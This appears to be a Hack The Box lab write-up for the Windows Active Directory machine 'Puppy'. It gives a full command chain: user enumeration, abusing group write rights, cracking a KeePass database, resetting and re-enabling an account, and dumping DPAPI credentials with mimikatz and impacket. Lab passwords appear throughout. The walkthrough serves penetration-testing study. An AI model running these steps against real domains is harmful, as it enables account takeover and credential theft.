---
date: 2025-09-27
categories: [Windows, Medium]
---

<img width="300" height="300" alt="Union" src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/6a127b39657062e42c1a8dfdcd23475d.png" />

---

| **Created by** | **Page**     | **Difficulty** | **OS**  |
|-------------|--------------|----------------|---------|
| [tr3nb0lone](https://app.hackthebox.com/users/1600618)    | [Hack The Box](https://www.hackthebox.com/)     | Medium           | Windows   |

---






## Enumeration

 - I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.10.11.70 -oG scan
	/opt/extractports scan
	nmap -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49669,49670,53473,53482,53497 -Pn -sCV 10.10.11.70 -oN ports
	```

	<img width="1656" height="961" alt="image" src="https://github.com/user-attachments/assets/cb97feee-9b0f-41ce-8408-2eb70ed143ef" />

- Port 53 was open, so I performed a DNS query to enumerate mail servers, which revealed an additional domain to add to `/etc/hosts`:
	
	```python
	dig @10.10.11.70 PUPPY.HTB mx
	```
	
	<img width="858" height="343" alt="image" src="https://github.com/user-attachments/assets/b403f21c-4c53-4a49-9f0a-df39ecb7a6a6" />

- HTB provided the initial credentials:  
	`levi.james : KingofAkron2025!`
- Using these, I connected via `rpcclient` to enumerate domain users:

	```python
	rpcclient -U 'levi.james' 10.10.11.70 
		enumdomusers
	```
	
	<img width="340" height="220" alt="image" src="https://github.com/user-attachments/assets/43253172-c908-4795-8702-78ac40330fdf" />

- I filtered the valid users with `kerbrute`:
	
	```python
	/opt/kerbrute userenum -d PUPPY.HTB  --dc 10.10.11.70  /home/rufo/usernames 
	```
	
	<img width="643" height="327" alt="image" src="https://github.com/user-attachments/assets/f1bfdc72-1164-4e7f-880b-327e27a8d8e9" />
	
- Then I used `ldapdomaindump` to gather more structured information about users and groups:

	```python
	ldapdomaindump -u 'PUPPY.HTB\levi.james' -p 'KingofAkron2025!' 10.10.11.70 
	```

- The user `adam.silver` stood out, as the account was disabled:

  <img width="1912" height="465" alt="image" src="https://github.com/user-attachments/assets/150faa92-d468-4d52-844c-0a60abfeca24" />

- Members of the `RMU` group included `steph.cooper` and `adam.silver`, suggesting they might be interesting targets:

  <img width="758" height="128" alt="image" src="https://github.com/user-attachments/assets/23373ca6-f987-4bc0-bc25-51f611eddef3" />

- Unusual groups like `Developers` and `Senior Devs` were also present:

	<img width="687" height="257" alt="image" src="https://github.com/user-attachments/assets/1ca4c215-1084-44fa-b38d-d8b39d97901d" />

## Privilege Enumeration & Abuse

- Using `bloodhound-python`, I collected data to analyze potential privilege escalation paths:

	```python
	bloodhound-python -c all -u 'levi.james' -p 'KingofAkron2025!' -ns 10.10.11.70 -d PUPPY.HTB
	```

- The user `levi.james` was a member of the `HR` group, which had `GenericWrite` permissions over the `Developers` group. This allowed us to add ourselves to it:

	```python
	net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "dc.PUPPY.HTB"
	net rpc group members "DEVELOPERS" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "dc.PUPPY.HTB"
	```
	<img width="1635" height="266" alt="image" src="https://github.com/user-attachments/assets/c8e05ef1-2be6-475d-97e8-94a7422d3d74" />

- Now part of the `Developers` group, we had read access to the previously restricted `DEV` share:

	```python
	netexec smb 10.10.11.70 -u usernames -p passwords --shares
	```

	<img width="939" height="260" alt="image" src="https://github.com/user-attachments/assets/5a12b4b2-72db-421f-a4dc-16ac310a4dfe" />

- Inside, we found a KeePass database file: `recovery.kdbx`. To open it, we needed the master password:

	```python
	smbclient -U 'levi.james' //10.10.11.70/DEV       
	```

	<img width="614" height="285" alt="image" src="https://github.com/user-attachments/assets/6a80677f-f0ee-487e-b0a9-87a5b2848b39" />

- Initially, `keepass2john` failed due to version incompatibility, but after downloading the latest version from GitHub, I extracted the hash and cracked it using `rockyou.txt`

	```python
	john --wordlist=/usr/share/wordlists/rockyou.txt /home/rufo/content/hashKeepass 
	```
	
	<img width="904" height="287" alt="image" src="https://github.com/user-attachments/assets/74f0b8ab-36f1-4172-b406-209eae6fe6bb" />

- The database contained several credentials. After testing them, I found valid credentials for `ant.edwards`

	<img width="862" height="224" alt="image" src="https://github.com/user-attachments/assets/1546e3fd-5bd2-4826-8a1f-41c934be5f18" />

## Lateral Movement

- According to BloodHound, `ant.edwards` (a member of `Senior Devs`) had `GenericAll` rights over `adam.silver`. This allowed a password reset:

	```python
	net rpc password "adam.silver" -U "PUPPY.HTTB"/"ant.edwards"%'Antman2025!' -S 10.10.11.70
	```

- Despite the reset, the account was still disabled. Using `bloodyAD`, I re-enabled the account:

	```python
	bloodyAD --host dc.PUPPY.HTB -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
	evil-winrm -i 10.10.11.70 -u  "adam.silver" -p 'PePe1234.-!asdf' 
	```

  <img width="560" height="251" alt="image" src="https://github.com/user-attachments/assets/21af54b8-2c74-489c-8596-fa771527071f" />

- Once logged in, I obtained the user flag.

## Privilege Escalation

- Exploring the system, I found a folder `C:\Backups` containing a zip archive: `site-backup-2024-12-30.zip`. It included plaintext credentials for `steph.cooper`:

	<img width="577" height="649" alt="image" src="https://github.com/user-attachments/assets/53b25ce6-e979-4535-a310-82cb01ebe975" />

- After verifying the credentials:

	```python
	netexec smb 10.10.11.70 -u steph.cooper -p ChefSteph2025!
	netexec winrm 10.10.11.70 -u steph.cooper -p ChefSteph2025!
	evil-winrm -i 10.10.11.70 -u steph.cooper -p ChefSteph2025!
	```

- There were two remaining domain admin accounts. After checking the file system with no success, I ran WinPEAS, which identified [DPAPI](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) credential files.

	<img width="1246" height="442" alt="image" src="https://github.com/user-attachments/assets/9b60a0ba-0bec-4329-b0ed-896fac4ba363" />

### Method 1: Extracting Credentials with Mimikatz

- I retrieved the user SID and listed hidden files:

	```python
	Get-LocalUser | Select-Object Name,SID
	Get-ChildItem -Force
	```

- Then used Mimikatz to dump the masterkey: 

	```python
	.\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" exit
	```

- With the masterkey, I decrypted the DPAPI credential file:

	```python
	.\mimikatz.exe "dpapi::cred /in:C:\Users\steph.cooper\appdata\roaming\microsoft\credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84" exit
	```

	<img width="414" height="364" alt="image" src="https://github.com/user-attachments/assets/fa2adef0-0771-4f6b-88b7-20d8664b13fa" />

- This revealed credentials for `steph.cooper_adm`, which granted access via WinRM:

	```python
	evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p FivethChipOnItsWay2025!
	```

	<img width="495" height="192" alt="image" src="https://github.com/user-attachments/assets/4842243c-0c03-4ff7-a3bf-0ccea5f49c65" />

### Method 2: Offline DPAPI Decryption with Impacket

- Following resources from [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets) and [Ben Heater's Notes](https://notes.benheater.com/books/active-directory/page/dumping-passwords-from-windows-credential-manager), I tried an offline approach.
- First, I dumped the masterkey:

	```python
	impacket-dpapi masterkey -f ./556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
	```

- Then used the key to decrypt the credential blob:

	```python
	impacket-dpapi credential  -f ./C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key "0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84"
	```
